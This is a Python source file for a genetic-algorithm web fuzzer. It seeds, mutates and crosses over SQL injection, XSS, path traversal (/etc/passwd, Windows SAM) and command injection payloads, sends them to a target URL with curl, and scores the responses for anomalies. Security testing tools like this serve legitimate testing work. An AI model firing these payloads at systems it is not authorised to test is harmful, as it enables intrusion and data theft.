"""
Genetic Fuzzing Engine
Advanced mutation-based fuzzing with adaptive payload generation
"""

import random
import string
import time
import logging
import subprocess
import json
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from pathlib import Path
import hashlib
import base64

logger = logging.getLogger(__name__)

@dataclass
class FuzzPayload:
    """Represents a fuzz payload with metadata"""
    data: bytes
    mutation_type: str
    parent_hash: Optional[str] = None
    success_rate: float = 0.0
    anomaly_score: float = 0.0
    execution_time: float = 0.0

class GeneticFuzzer:
    """Advanced genetic fuzzing engine with mutation and adaptation"""
    
    def __init__(self, target_url: str = None, wordlist_path: str = None):
        self.target_url = target_url
        self.wordlist_path = wordlist_path or "wordlists/common.txt"
        self.population: List[FuzzPayload] = []
        self.mutation_history: Dict[str, int] = {}
        self.successful_payloads: List[FuzzPayload] = []
        self.anomaly_patterns: Dict[str, float] = {}
        
        # Genetic algorithm parameters
        self.population_size = 50
        self.mutation_rate = 0.3
        self.crossover_rate = 0.7
        self.generation_limit = 100
        
        # Response analysis patterns
        self.anomaly_indicators = {
            'error_codes': [500, 502, 503, 504],
            'content_length_threshold': 1000,
            'redirect_codes': [301, 302, 303, 307, 308],
            'timeout_threshold': 10.0
        }
        
        self._load_wordlist()
        self._initialize_population()
    
    def _load_wordlist(self):
        """Load base wordlist for fuzzing"""
        try:
            wordlist_path = Path(self.wordlist_path)
            if not wordlist_path.exists():
                self._create_default_wordlist()
            
            with open(wordlist_path, 'r') as f:
                self.base_words = [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.warning(f"Failed to load wordlist: {e}")
            self.base_words = self._get_default_words()
    
    def _create_default_wordlist(self):
        """Create default wordlist with common fuzzing patterns"""
        default_words = [
            # SQL Injection patterns
            "'", "''", "`", "``", "\\", "\\\\", "/*", "*/", "--", "#",
            "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP",
            "OR 1=1", "OR '1'='1", "OR 1=1--", "OR 1=1#",
            
            # XSS patterns
            "<script>", "</script>", "javascript:", "onload=", "onerror=",
            "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
            
            # Path traversal
            "../", "..\\", "....//", "....\\\\", "%2e%2e%2f", "%2e%2e%5c",
            
            # Command injection
            ";", "|", "&", "&&", "||", "`", "$()", "$(())",
            
            # Buffer overflow patterns
            "A" * 100, "A" * 500, "A" * 1000, "A" * 5000,
            
            # Special characters
            "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+",
            "[", "]", "{", "}", "\\", "|", ";", ":", "'", '"', ",", ".", "<", ">", "/", "?"
        ]
        
        wordlist_dir = Path(self.wordlist_path).parent
        wordlist_dir.mkdir(exist_ok=True)
        
        with open(self.wordlist_path, 'w') as f:
            for word in default_words:
                f.write(word + '\n')
    
    def _get_default_words(self) -> List[str]:
        """Get default words if wordlist loading fails"""
        return ["test", "admin", "root", "user", "password", "123", "abc"]
    
    def _initialize_population(self):
        """Initialize the initial population of fuzz payloads"""
        logger.info("Initializing fuzz population")
        
        for _ in range(self.population_size):
            # Create diverse initial population
            payload_type = random.choice(['sql', 'xss', 'path', 'command', 'buffer'])
            
            if payload_type == 'sql':
                data = self._generate_sql_payload()
            elif payload_type == 'xss':
                data = self._generate_xss_payload()
            elif payload_type == 'path':
                data = self._generate_path_payload()
            elif payload_type == 'command':
                data = self._generate_command_payload()
            else:  # buffer
                data = self._generate_buffer_payload()
            
            payload = FuzzPayload(
                data=data.encode('utf-8'),
                mutation_type='initial',
                success_rate=0.0,
                anomaly_score=0.0
            )
            
            self.population.append(payload)
    
    def _generate_sql_payload(self) -> str:
        """Generate SQL injection payload"""
        patterns = [
            "' OR 1=1--",
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1#",
            "admin'--",
            "admin'/*",
            "' OR 1=1 LIMIT 1--"
        ]
        return random.choice(patterns)
    
    def _generate_xss_payload(self) -> str:
        """Generate XSS payload"""
        patterns = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "';alert(1);//",
            "\"><script>alert(1)</script>"
        ]
        return random.choice(patterns)
    
    def _generate_path_payload(self) -> str:
        """Generate path traversal payload"""
        patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        return random.choice(patterns)
    
    def _generate_command_payload(self) -> str:
        """Generate command injection payload"""
        patterns = [
            "; ls -la",
            "| whoami",
            "& dir",
            "&& cat /etc/passwd",
            "|| id",
            "`whoami`",
            "$(id)",
            "; ping -c 1 127.0.0.1"
        ]
        return random.choice(patterns)
    
    def _generate_buffer_payload(self) -> str:
        """Generate buffer overflow payload"""
        sizes = [100, 200, 500, 1000, 2000]
        size = random.choice(sizes)
        return "A" * size
    
    def mutate_payload(self, payload: FuzzPayload) -> FuzzPayload:
        """Apply genetic mutations to a payload"""
        mutation_types = [
            'bit_flip', 'byte_substitution', 'insertion', 'deletion',
            'repetition', 'case_change', 'encoding', 'concatenation'
        ]
        
        mutation_type = random.choice(mutation_types)
        original_data = payload.data.decode('utf-8', errors='ignore')
        
        if mutation_type == 'bit_flip':
            mutated_data = self._bit_flip_mutation(original_data)
        elif mutation_type == 'byte_substitution':
            mutated_data = self._byte_substitution_mutation(original_data)
        elif mutation_type == 'insertion':
            mutated_data = self._insertion_mutation(original_data)
        elif mutation_type == 'deletion':
            mutated_data = self._deletion_mutation(original_data)
        elif mutation_type == 'repetition':
            mutated_data = self._repetition_mutation(original_data)
        elif mutation_type == 'case_change':
            mutated_data = self._case_change_mutation(original_data)
        elif mutation_type == 'encoding':
            mutated_data = self._encoding_mutation(original_data)
        else:  # concatenation
            mutated_data = self._concatenation_mutation(original_data)
        
        return FuzzPayload(
            data=mutated_data.encode('utf-8'),
            mutation_type=mutation_type,
            parent_hash=hashlib.md5(payload.data).hexdigest(),
            success_rate=payload.success_rate,
            anomaly_score=payload.anomaly_score
        )
    
    def _bit_flip_mutation(self, data: str) -> str:
        """Flip random bits in the payload"""
        if not data:
            return data
        
        # Convert to bytes, flip random bit, convert back
        data_bytes = data.encode('utf-8')
        if len(data_bytes) == 0:
            return data
        
        pos = random.randint(0, len(data_bytes) - 1)
        byte_val = data_bytes[pos]
        bit_pos = random.randint(0, 7)
        new_byte = byte_val ^ (1 << bit_pos)
        
        new_bytes = bytearray(data_bytes)
        new_bytes[pos] = new_byte
        
        return new_bytes.decode('utf-8', errors='ignore')
    
    def _byte_substitution_mutation(self, data: str) -> str:
        """Substitute random bytes with new values"""
        if not data:
            return data
        
        pos = random.randint(0, len(data) - 1)
        new_char = random.choice(string.printable)
        
        return data[:pos] + new_char + data[pos + 1:]
    
    def _insertion_mutation(self, data: str) -> str:
        """Insert random characters at random positions"""
        if not data:
            return random.choice(string.printable)
        
        pos = random.randint(0, len(data))
        insert_char = random.choice(string.printable)
        
        return data[:pos] + insert_char + data[pos:]
    
    def _deletion_mutation(self, data: str) -> str:
        """Delete random characters"""
        if len(data) <= 1:
            return data
        
        pos = random.randint(0, len(data) - 1)
        return data[:pos] + data[pos + 1:]
    
    def _repetition_mutation(self, data: str) -> str:
        """Repeat parts of the payload"""
        if len(data) < 2:
            return data + data
        
        start = random.randint(0, len(data) - 1)
        end = random.randint(start + 1, len(data))
        repeat_count = random.randint(1, 3)
        
        repeated_part = data[start:end] * repeat_count
        return data + repeated_part
    
    def _case_change_mutation(self, data: str) -> str:
        """Change case of random characters"""
        if not data:
            return data
        
        pos = random.randint(0, len(data) - 1)
        char = data[pos]
        
        if char.isupper():
            new_char = char.lower()
        elif char.islower():
            new_char = char.upper()
        else:
            return data
        
        return data[:pos] + new_char + data[pos + 1:]
    
    def _encoding_mutation(self, data: str) -> str:
        """Apply various encoding mutations"""
        encodings = ['url', 'base64', 'hex', 'unicode']
        encoding = random.choice(encodings)
        
        try:
            if encoding == 'url':
                import urllib.parse
                return urllib.parse.quote(data)
            elif encoding == 'base64':
                return base64.b64encode(data.encode()).decode()
            elif encoding == 'hex':
                return data.encode().hex()
            elif encoding == 'unicode':
                return ''.join([f'\\u{ord(c):04x}' for c in data])
        except Exception:
            return data
        
        return data
    
    def _concatenation_mutation(self, data: str) -> str:
        """Concatenate with random strings"""
        suffixes = ['', ';', '|', '&', '&&', '||', '`', '$(', '{{', '}}']
        suffix = random.choice(suffixes)
        return data + suffix
    
    def crossover_payloads(self, parent1: FuzzPayload, parent2: FuzzPayload) -> Tuple[FuzzPayload, FuzzPayload]:
        """Perform crossover between two payloads"""
        data1 = parent1.data.decode('utf-8', errors='ignore')
        data2 = parent2.data.decode('utf-8', errors='ignore')
        
        if len(data1) < 2 or len(data2) < 2:
            return parent1, parent2
        
        # Single-point crossover
        point1 = random.randint(1, len(data1) - 1)
        point2 = random.randint(1, len(data2) - 1)
        
        child1_data = data1[:point1] + data2[point2:]
        child2_data = data2[:point2] + data1[point1:]
        
        child1 = FuzzPayload(
            data=child1_data.encode('utf-8'),
            mutation_type='crossover',
            parent_hash=hashlib.md5(parent1.data).hexdigest(),
            success_rate=(parent1.success_rate + parent2.success_rate) / 2,
            anomaly_score=(parent1.anomaly_score + parent2.anomaly_score) / 2
        )
        
        child2 = FuzzPayload(
            data=child2_data.encode('utf-8'),
            mutation_type='crossover',
            parent_hash=hashlib.md5(parent2.data).hexdigest(),
            success_rate=(parent1.success_rate + parent2.success_rate) / 2,
            anomaly_score=(parent1.anomaly_score + parent2.anomaly_score) / 2
        )
        
        return child1, child2
    
    def evaluate_payload(self, payload: FuzzPayload) -> Dict[str, Any]:
        """Evaluate a payload against the target"""
        if not self.target_url:
            return {'status': 'no_target', 'anomaly_score': 0.0}
        
        start_time = time.time()
        
        try:
            # Use curl for HTTP requests
            cmd = [
                'curl', '-s', '-w', '%{http_code}:%{time_total}:%{size_download}',
                '-o', '/dev/null', '--max-time', '10',
                f'{self.target_url}?test={payload.data.decode("utf-8", errors="ignore")}'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            
            execution_time = time.time() - start_time
            
            # Parse response
            if result.returncode == 0 and result.stdout:
                parts = result.stdout.strip().split(':')
                if len(parts) >= 3:
                    status_code = int(parts[0])
                    response_time = float(parts[1])
                    content_length = int(parts[2])
                    
                    anomaly_score = self._calculate_anomaly_score(
                        status_code, response_time, content_length, execution_time
                    )
                    
                    return {
                        'status': 'success',
                        'status_code': status_code,
                        'response_time': response_time,
                        'content_length': content_length,
                        'execution_time': execution_time,
                        'anomaly_score': anomaly_score
                    }
            
            return {
                'status': 'error',
                'execution_time': execution_time,
                'anomaly_score': 0.0
            }
            
        except subprocess.TimeoutExpired:
            return {
                'status': 'timeout',
                'execution_time': time.time() - start_time,
                'anomaly_score': 1.0  # High anomaly for timeouts
            }
        except Exception as e:
            return {
                'status': 'error',
                'error': str(e),
                'execution_time': time.time() - start_time,
                'anomaly_score': 0.0
            }
    
    def _calculate_anomaly_score(self, status_code: int, response_time: float, 
                                content_length: int, execution_time: float) -> float:
        """Calculate anomaly score based on response characteristics"""
        score = 0.0
        
        # Status code anomalies
        if status_code in self.anomaly_indicators['error_codes']:
            score += 0.3
        elif status_code in self.anomaly_indicators['redirect_codes']:
            score += 0.2
        
        # Response time anomalies
        if response_time > self.anomaly_indicators['timeout_threshold']:
            score += 0.4
        elif response_time > 5.0:
            score += 0.2
        
        # Content length anomalies
        if content_length > self.anomaly_indicators['content_length_threshold']:
            score += 0.2
        elif content_length < 100:
            score += 0.1
        
        # Execution time anomalies
        if execution_time > 10.0:
            score += 0.3
        
        return min(score, 1.0)
    
    def select_parents(self) -> List[FuzzPayload]:
        """Select parents for next generation using tournament selection"""
        tournament_size = 3
        parents = []
        
        for _ in range(2):
            tournament = random.sample(self.population, tournament_size)
            winner = max(tournament, key=lambda p: p.success_rate + p.anomaly_score)
            parents.append(winner)
        
        return parents
    
    def evolve_generation(self):
        """Evolve the population to the next generation"""
        new_population = []
        
        # Keep best performers
        sorted_population = sorted(
            self.population, 
            key=lambda p: p.success_rate + p.anomaly_score, 
            reverse=True
        )
        
        elite_count = int(self.population_size * 0.1)  # Keep 10% elite
        new_population.extend(sorted_population[:elite_count])
        
        # Generate new individuals
        while len(new_population) < self.population_size:
            if random.random() < self.crossover_rate:
                # Crossover
                parents = self.select_parents()
                child1, child2 = self.crossover_payloads(parents[0], parents[1])
                
                # Mutate children
                if random.random() < self.mutation_rate:
                    child1 = self.mutate_payload(child1)
                if random.random() < self.mutation_rate:
                    child2 = self.mutate_payload(child1)
                
                new_population.extend([child1, child2])
            else:
                # Mutation only
                parent = random.choice(self.population)
                child = self.mutate_payload(parent)
                new_population.append(child)
        
        # Trim to population size
        self.population = new_population[:self.population_size]
    
    def run_fuzzing(self, generations: int = None) -> Dict[str, Any]:
        """Run the genetic fuzzing algorithm"""
        generations = generations or self.generation_limit
        logger.info(f"Starting genetic fuzzing for {generations} generations")
        
        results = {
            'generations': [],
            'best_payloads': [],
            'anomalies_found': 0,
            'total_payloads_tested': 0
        }
        
        for generation in range(generations):
            logger.info(f"Generation {generation + 1}/{generations}")
            
            # Evaluate all payloads
            for payload in self.population:
                evaluation = self.evaluate_payload(payload)
                payload.execution_time = evaluation.get('execution_time', 0.0)
                payload.anomaly_score = evaluation.get('anomaly_score', 0.0)
                
                # Update success rate based on anomalies
                if payload.anomaly_score > 0.5:
                    payload.success_rate = min(payload.success_rate + 0.1, 1.0)
                    results['anomalies_found'] += 1
                
                results['total_payloads_tested'] += 1
            
            # Record generation statistics
            avg_anomaly = sum(p.anomaly_score for p in self.population) / len(self.population)
            best_payload = max(self.population, key=lambda p: p.anomaly_score)
            
            generation_stats = {
                'generation': generation + 1,
                'avg_anomaly_score': avg_anomaly,
                'best_anomaly_score': best_payload.anomaly_score,
                'best_payload': best_payload.data.decode('utf-8', errors='ignore')
            }
            
            results['generations'].append(generation_stats)
            
            # Store high-anomaly payloads
            if best_payload.anomaly_score > 0.7:
                results['best_payloads'].append({
                    'payload': best_payload.data.decode('utf-8', errors='ignore'),
                    'anomaly_score': best_payload.anomaly_score,
                    'mutation_type': best_payload.mutation_type
                })
            
            # Evolve to next generation
            if generation < generations - 1:
                self.evolve_generation()
        
        logger.info(f"Fuzzing completed. Found {results['anomalies_found']} anomalies")
        return results
    
    def save_results(self, results: Dict[str, Any], output_path: str = "results/fuzzing_results.json"):
        """Save fuzzing results to file"""
        try:
            output_dir = Path(output_path).parent
            output_dir.mkdir(exist_ok=True)
            
            with open(output_path, 'w') as f:
                json.dump(results, f, indent=2)
            
            logger.info(f"Fuzzing results saved to {output_path}")
        except Exception as e:
            logger.error(f"Failed to save fuzzing results: {e}")
    
    def get_payload_statistics(self) -> Dict[str, Any]:
        """Get statistics about the current payload population"""
        if not self.population:
            return {}
        
        anomaly_scores = [p.anomaly_score for p in self.population]
        success_rates = [p.success_rate for p in self.population]
        
        return {
            'population_size': len(self.population),
            'avg_anomaly_score': sum(anomaly_scores) / len(anomaly_scores),
            'max_anomaly_score': max(anomaly_scores),
            'avg_success_rate': sum(success_rates) / len(success_rates),
            'max_success_rate': max(success_rates),
            'mutation_distribution': self.mutation_history
        } 